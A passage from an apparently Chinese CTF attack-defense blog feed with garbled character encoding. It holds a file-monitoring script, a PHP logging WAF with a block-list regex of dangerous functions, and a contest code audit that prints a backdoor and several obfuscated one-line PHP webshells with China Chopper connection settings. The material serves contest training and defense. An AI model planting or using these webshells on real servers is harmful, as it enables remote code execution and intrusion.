&quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"># ç›®å½•åˆ›å»º</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"># è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"># è®¡ç®—æœºæ–‡ä»¶MD5å€¼</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"># è·å–æ‰€æœ‰æ–‡ä»¶MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"># å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print u&#x27;---------start------------&#x27;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG</span><br><span class="line">    print u&#x27;[*] pre work end!&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span><br></pre></td></tr></table></figure><h4 id="ä¸æ­»é©¬æ¸…ç†ï¼š"><a href="#ä¸æ­»é©¬æ¸…ç†ï¼š" class="headerlink" title="ä¸æ­»é©¬æ¸…ç†ï¼š"></a>ä¸æ­»é©¬æ¸…ç†ï¼š</h4><p><code>ps aux www|grep shell.php</code></p><p>æ‰¾åˆ°pidåæ€æ‰è¿›ç¨‹å°±å¯ä»¥ï¼Œä½ åˆ æ‰è„šæœ¬æ˜¯èµ·ä¸äº†ä½œç”¨çš„ï¼Œå› ä¸ºphpæ‰§è¡Œçš„æ—¶å€™å·²ç»æŠŠè„šæœ¬è¯»è¿›å»è§£é‡Šæˆopcodeè¿è¡Œäº†</p><p>é‡å¯phpç­‰webæœåŠ¡</p><p>ç”¨ä¸€ä¸ª<code>ignore_user_abort(true)</code>è„šæœ¬ï¼Œä¸€ç›´ç«äº‰å†™å…¥ï¼ˆæ–­æ–­ç»­ç»­ï¼‰ã€‚usleepè¦ä½äºå¯¹æ–¹ä¸æ­»é©¬è®¾ç½®çš„å€¼ã€‚</p><p>åˆ›å»ºä¸€ä¸ªå’Œä¸æ­»é©¬ç”Ÿæˆçš„é©¬ä¸€æ ·åå­—çš„æ–‡ä»¶å¤¹ã€‚</p><h4 id="ä¸æ­»é©¬ã€wafã€æŠ“æµé‡çš„waf"><a href="#ä¸æ­»é©¬ã€wafã€æŠ“æµé‡çš„waf" class="headerlink" title="ä¸æ­»é©¬ã€wafã€æŠ“æµé‡çš„waf"></a>ä¸æ­»é©¬ã€wafã€æŠ“æµé‡çš„waf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸æ­»é©¬ä½¿ç”¨åŸç†å°±æ˜¯ä¸æ–­å°†çš„è‡ªå·±å†™å…¥ï¼Œé€ æˆè¿›ç¨‹å ç”¨ï¼Œè¢«åˆ é™¤åä¸€ç§’å°±å·²ç»ç”Ÿæˆæ–°çš„äº†ï¼Œè¿˜æœ‰å°±æ˜¯.XXXæ–‡ä»¶å»ºç«‹éšè—æ–‡ä»¶ä¸æ­»é©¬ã€‚</span><br><span class="line">wafï¼Œè„šæœ¬wafå¯ä»¥é˜²æ­¢ä¸€èˆ¬æƒ…å†µä¸‹çš„å±é™©å­—ç¬¦ï¼Œä½†æ˜¯ä¸èƒ½æŠ¥å¤ªå¤§å¸Œæœ›ï¼Œ </span><br></pre></td></tr></table></figure><p><code>require_once(&#39;waf.php&#39;);</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /tmp/test/html -name <span class="string">&quot;*.php&quot;</span> | xargs sed -i <span class="string">&#x27;1s/^/&lt;?php include_once &quot;\/tmp\/waf.php&quot;;?&gt;\n /&#x27;</span></span><br><span class="line">````</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠ“æµé‡wafï¼ŒæŒ‚è½½åå¯ä»¥è®©é˜²å®ˆé˜Ÿå‘˜_å®æ—¶å…³æ³¨æ—¥å¿—ï¼Œä¸€æ—¦å‘ç°è¢«getflagäº†ï¼Œå°±é€šè¿‡æ—¥å¿—ç›¸åº”çš„æ‰‹æ³•æ”»å‡»åˆ«äºº </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**wafè„šæœ¬**</span><br><span class="line"></span><br><span class="line">&gt; PHPWafç”¨æ¥è®°å½•è®¿é—®è¯·æ±‚ï¼Œé€šè¿‡åˆ†æè®¿é—®è¯·æ±‚æ¥åˆ¤æ–­å¯¹æ–¹çš„æ”»å‡»æ–¹å¼ï¼Œä½œç”¨æ˜¯æ„ŸçŸ¥æ¼æ´ï¼Œåˆ¤æ–­æ”»å‡»æ–¹å¼ï¼Œä»è€Œä¿®å¤æ¼æ´ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php //éƒ¨ç½²wafå¯èƒ½ä¼šå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ï¼Œéœ€è¦è°¨æ…éƒ¨ç½²ã€‚    error_reporting(0);    define('LOG_FILENAME','log.txt');    function waf()    {        if (!function_exists('getallheaders')) {            function getallheaders() {                foreach ($_SERVER as $name => $value) {                    if (substr($name, 0, 5) == 'HTTP_')                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;                }                return $headers;            }        }        $get = $_GET;        $post = $_POST;        $cookie = $_COOKIE;        $header = getallheaders();        $files = $_FILES;        $ip = $_SERVER["REMOTE_ADDR"];        $method = $_SERVER['REQUEST_METHOD'];        $filepath = $_SERVER["SCRIPT_NAME"];                //rewirte shell which uploaded by others, you can do more        foreach ($_FILES as $key => $value) {            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);            file_put_contents($_FILES[$key]['tmp_name'], "virink");        }        unset($header['Accept']);//fix a bug        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);        //deal with        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";        $vpattern = explode("|",$pattern);        $bool = false;        foreach ($input as $k => $v) {            foreach($vpattern as $value){                foreach ($v as $kk => $vv) {                    if (preg_match( "/$value/i", $vv )){                        $bool = true;                        logging($input);                        break;                    }                }                if($bool) break;            }            if($bool) break;        }    }     function logging($var){        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);    }    waf();?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wafçš„æ¿€æ´»æ–¹å¼ï¼š</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>php.inié€‰é¡¹ï¼šauto_prepend_file &#x3D;ä¸auto_append_file &#x3D;åŒ…å«wafï¼Œéœ€è¦æƒé™è¾ƒé«˜ã€‚</p></li><li><p>config.php ä¸­åŒ…å«waf</p></li><li><p>è®©æ‰€æœ‰çš„æ–‡ä»¶éƒ½åŒ…å«waf</p></li></ol><p>&#96;&#96;&#96;</p><h3 id="0x07æµé‡åˆ†æ"><a href="#0x07æµé‡åˆ†æ" class="headerlink" title="0x07æµé‡åˆ†æ"></a>0x07æµé‡åˆ†æ</h3><ol><li>æŸ¥çœ‹å½“å‰è®¿é—®é‡å‰åçš„é“¾æ¥</li></ol><p><code>cat /var/log/apache2/access.log | cut -f4 -d | sort | uniq -c | sort -k -r | head -</code></p><ol start="2"><li><p>æ–‡ä»¶ç›‘æ§å¢åˆ æ”¹æŸ¥çš„æ–‡ä»¶ä½¿ç”¨è„šæœ¬Monitorï¼ˆä¸€ä¸ªç®€å•çš„æ–‡ä»¶ç›‘æ§ç¤ºä¾‹è„šæœ¬ï¼Œå¯ä»¥ç›‘æ§åˆ›å»ºã€åˆ é™¤ã€ç§»åŠ¨ã€å±æ€§ä¿®æ”¹æ“ä½œï¼Œè‡ªåŠ¨åˆ é™¤æ–°å¢æ–‡ä»¶æˆ–ç›®å½•ã€‚å·²ä½¿ç”¨pyinstalleræ‰“åŒ…æˆäº†linuxå¯æ‰§è¡Œç¨‹åºï¼‰</p></li><li><p>chattr +i å‘½ä»¤é”æ­»ç½‘ç«™ç›®å½•å’Œæ–‡ä»¶ï¼Œé˜²æ­¢å…¶ä»–é˜Ÿä¼åˆ é™¤ç½‘ç«™å®•æœºã€‚æ³¨ï¼šæ·»åŠ åä¸å–æ¶ˆç‰¹æ®Šæƒé™ å³ä½¿æ˜¯rootç”¨æˆ·ä¹Ÿæ— æ³•åˆ é™¤&#x2F;ä¿®æ”¹æ–‡ä»¶</p><p>chattr -R +i &#x2F;var&#x2F;www&#x2F;html<br>chattr -R +i &#x2F;var&#x2F;www&#x2F;html&#x2F;*<br>(å–æ¶ˆå‘½ä»¤å°†+å·æ”¹æˆ- chattr -R -i &#x2F;var&#x2F;www&#x2F;htmlï¼‰</p></li><li><p>ä½¿ç”¨wafå…¨å±€åŒ…å«wafï¼Œæ³¨æ„wafçš„æ—¥å¿—å’Œwebloggeræ—¥å¿—ä¸ç¬¬äºŒé¡¹æ–‡ä»¶ç›‘æ§å†²çªï¼Œå»ºè®®å»ºç«‹æ–‡ä»¶å¤¹å°†æ—¥å¿—å’Œwebloggeræ—¥å¿—æ”¾åˆ°æŒ‡å®šæ–‡ä»¶å¤¹ä¸­ï¼Œé¿å¼€æ–‡ä»¶ç›‘æ§ï¼Œ</p><p>sudo find &#x2F;var&#x2F;www&#x2F;html&#x2F;path_you_want -type f -path â€œ*.phpâ€ | xargs sed -i â€œs&#x2F;&lt;?php&#x2F;&lt;?php\nrequire_once(â€™&#x2F;tmp&#x2F;waf.phpâ€™);\n&#x2F;gâ€<br>#æ„æ€å°±æ˜¯æŸ¥æ‰¾éœ€è¦åŠ wafçš„ç›®å½•ä¸‹æ‰€æœ‰phpæ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨æ·»åŠ ä¸€å¥ï¼Œç”¨require_onceå‡½æ•°å¼•å…¥&#x2F;tmp&#x2F;waf.phpæ–‡ä»¶ã€‚å› ä¸ºsedå‘½ä»¤åˆ©ç”¨ &#x2F; åŒºåˆ†æ–‡ä»¶ä¸­çš„åŸå­—ç¬¦ä¸²å’Œä¿®æ”¹çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹ &#x2F; è¿›è¡Œè½¬ä¹‰ã€‚ç±»ä¼¼äºåœ¨å•å¼•å·ä¸­å†æ¬¡ä½¿ç”¨å•å¼•å·æ—¶æˆ‘ä»¬ä¹Ÿè¦ç”¨åæ–œæ è½¬ä¹‰ã€‚</p></li><li><p>åå°ä¸€å®šè¦ç™»é™†åå°ï¼Œæœ‰æ²¡æœ‰å¼±å£ä»¤ï¼Œä¿®æ”¹æˆå¼ºå£ä»¤ã€‚</p></li><li><p>ä¸åªæ˜¯åå°ï¼Œphpmyadminã€æµ‹è¯•é¡µé¢å®¹æ˜“å‡ºç°sqlæ³¨å…¥ï¼Œrceä¹‹ç±»çš„è¿™äº›</p></li></ol><h2 id="AWDèµ„æºå°åˆé›†"><a href="#AWDèµ„æºå°åˆé›†" class="headerlink" title="AWDèµ„æºå°åˆé›†:"></a>AWDèµ„æºå°åˆé›†:</h2><p><a href="https://neversec.top/20190415/how-to-awd.html">https://neversec.top/20190415/how-to-awd.html</a></p><p><strong>å‚è€ƒç½‘ç«™ï¼š</strong></p><p><a href="https://blog.csdn.net/qq/_42114918/article/details/82785960#comments">https://blog.csdn.net/qq\_42114918/article/details/82785960#comments</a></p><p><a href="https://blog.csdn.net/qq/_43625917/article/details/96158713">https://blog.csdn.net/qq\_43625917/article/details/96158713</a></p><p><a href="http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html">http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="http://www.8sec.cc/index.php/archives/97/">http://www.8sec.cc/index.php/archives/97/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š&quot;&gt;&lt;a href=&quot;#CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š&quot;&gt;&lt;/a&gt;CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š&lt;/h1&gt;&lt;p&gt;ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°ï¼š&lt;a</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="æ”»é˜²" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-09-09T01:47:07.275Z</published>
    <updated>2022-09-09T14:23:42.094Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡"><a href="#CTF-AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡" class="headerlink" title="CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡"></a>CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡</h1><p>ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°ï¼š<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102652029</a></p><p>ä»Šå¤©å…ˆæŠŠå»å¹´çš„AWDä»£ç å®¡è®¡ä¸€ä¸‹,ä»¥åæœ‰æ—¶é—´å°±æŠŠä»Šå¹´çš„AWDä»£ç å®¡è®¡å†™ä¸€ä¸‹</p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#x27;header.php&#x27;;</span><br><span class="line">@eval($_REQUEST[&#x27;aa&#x27;]);</span><br><span class="line">echo &#x27;eval&#x27;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5MTk1NDkzLzA?x-oss-process=image/format,png"></p><p>é¦–å…ˆæ‰“å¼€index.php,ä¸€ç›®äº†ç„¶,å¯ä»¥çœ‹åˆ°å¤´æ–‡ä»¶æœ‰ä¸€å¥è¯æœ¨é©¬,å¯†ç æ˜¯<code>aa</code></p><p>è¿™é‡Œä½¿ç”¨ä¸­å›½èœåˆ€å¯ä»¥ç›´æ¥è¿ä¸Šä¸€å¥è¯æœ¨é©¬,è¿›å…¥æœåŠ¡å™¨</p><h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><h4 id="äº†è§£ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†"><a href="#äº†è§£ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†" class="headerlink" title="äº†è§£ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†"></a>äº†è§£ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†</h4><h6 id="ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†ï¼š"><a href="#ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†ï¼š" class="headerlink" title="ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†ï¼š"></a>ä¸€å¥è¯è„šæœ¬çš„å·¥ä½œåŸç†ï¼š</h6><p>ä¸€å¥è¯æ¶æ„è„šæœ¬åˆ†ææœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ã€‚(æ­¤å¤„ä»¥phpè„šæœ¬è¯­è¨€ç®€è¿°åŸç†ï¼‰</p><p>ä¸€å¥è¯æ¶æ„è„šæœ¬æœåŠ¡ç«¯å°±æ˜¯æˆ‘ä»¬è¦ç”¨æ¥æ’å…¥åˆ°phpæ–‡ä»¶ä¸­çš„aspè¯­å¥ï¼Œï¼ˆä¸ä»…ä»…æ˜¯ä»¥phpä¸ºåç¼€çš„æ•°æ®åº“æ–‡ä»¶ï¼‰ï¼Œè¯¥è¯­å¥å°†å›ä¸ºè§¦å‘ï¼Œæ¥æ”¶å…¥ä¾µè€…é€šè¿‡å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œæ‰§è¡Œå¹¶å®Œæˆç›¸åº”çš„æ“ä½œï¼ŒæœåŠ¡ç«¯çš„ä»£ç å†…å®¹ä¸º<code>@eval($\_REQUEST\[â€˜aaâ€™\]);</code> å…¶ä¸­aaå¯ä»¥è‡ªå·±ä¿®æ”¹</p><p>ä¸€å¥è¯æ¶æ„è„šæœ¬å®¢æˆ·ç«¯ï¼ˆå³ä¸ºä¸­å›½èœåˆ€ä¸»ç¨‹åºï¼‰ç”¨æ¥å‘æœåŠ¡ç«¯æäº¤æ§åˆ¶æ•°æ®çš„ï¼Œæäº¤çš„æ•°æ®é€šè¿‡æœåŠ¡ç«¯æ„æˆå®Œæ•´çš„phpåŠŸèƒ½è¯­å¥å¹¶æ‰§è¡Œ.</p><blockquote><p>ä¸­å›½èœåˆ€çš„è¯·æ±‚æ–¹å¼ä¸ºpostã€‚</p></blockquote><h4 id="ä¸€å¥è¯è„šæœ¬çš„å˜å½¢"><a href="#ä¸€å¥è¯è„šæœ¬çš„å˜å½¢" class="headerlink" title="ä¸€å¥è¯è„šæœ¬çš„å˜å½¢"></a>ä¸€å¥è¯è„šæœ¬çš„å˜å½¢</h4><h5 id="æ¡ˆä¾‹1"><a href="#æ¡ˆä¾‹1" class="headerlink" title="æ¡ˆä¾‹1"></a>æ¡ˆä¾‹1</h5><p>åŠ å¯†ç±»å˜å½¢</p><p>phpä¸€å¥è¯æ¶æ„è„šæœ¬å¸¦404é¡µé¢,å¸¦MD5åŠ å¯†,å¯æµè§ˆå™¨POSTä»»æ„phpä»£ç æ‰§è¡Œ. ä»£ç å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;404 Not Found!&lt;/br&gt;&quot;; error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;com&#x27;]) &amp;&amp; md5($_POST[&#x27;com&#x27;]) == &#x27;791dc312b38016ef998c1c146104cd5a&#x27; &amp;&amp; isset($_POST[&#x27;content&#x27;])) $content = strtr($_POST[&#x27;content&#x27;], &#x27;-_,&#x27;, &#x27;+/=&#x27;);eval(base64_decode($content));</span><br><span class="line">echo &quot;We&#x27;re sorry but the page your are looking for is Not Found...&quot;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>åœ¨èœåˆ€é‡Œå†™<code>http://xx.xx.xx.xx/test.php</code></p><p>å¯†ç :<code>page</code></p><p>èœåˆ€é…ç½®å¡«ï¼š</p><p><code>ï¼œOï¼com=settoken&amp;content=ZXZhbCgkX1BPU1RbJ3BhZ2UnXSk7ï¼œ/Oï¼</code></p><h5 id="æ¡ˆä¾‹2-å˜é‡æ‹¼æ¥ç±»å˜å½¢"><a href="#æ¡ˆä¾‹2-å˜é‡æ‹¼æ¥ç±»å˜å½¢" class="headerlink" title="æ¡ˆä¾‹2 å˜é‡æ‹¼æ¥ç±»å˜å½¢"></a>æ¡ˆä¾‹2 å˜é‡æ‹¼æ¥ç±»å˜å½¢</h5><p>webshellçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#x27;n985de9&#x27;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>åœ¨èœåˆ€é‡Œå†™<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>å¯†ç æ˜¯:<code>0</code></p><p>èœåˆ€é…ç½®å¡«ï¼š</p><p><code>ï¼œOï¼n985de9=QGV2YWwoJF9QT1NUWzBdKTs=ï¼œ/Oï¼</code></p><h5 id="æ¡ˆä¾‹3-åŠ å¯†æ‹¼æ¥ç±»å˜å½¢"><a href="#æ¡ˆä¾‹3-åŠ å¯†æ‹¼æ¥ç±»å˜å½¢" class="headerlink" title="æ¡ˆä¾‹3 åŠ å¯†æ‹¼æ¥ç±»å˜å½¢"></a>æ¡ˆä¾‹3 åŠ å¯†æ‹¼æ¥ç±»å˜å½¢</h5><p>webshellçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure 